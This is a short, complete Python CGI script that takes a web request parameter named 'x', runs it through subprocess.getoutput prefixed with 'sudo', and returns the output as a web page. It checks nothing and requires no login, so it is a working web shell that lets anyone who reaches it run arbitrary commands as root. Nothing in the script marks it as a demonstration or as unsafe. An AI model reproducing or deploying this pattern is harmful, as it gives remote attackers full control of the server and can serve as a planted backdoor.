#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

y= cgi.FieldStorage()				
o = y.getvalue("x")
z=subprocess.getoutput("sudo " +o)
print(z)

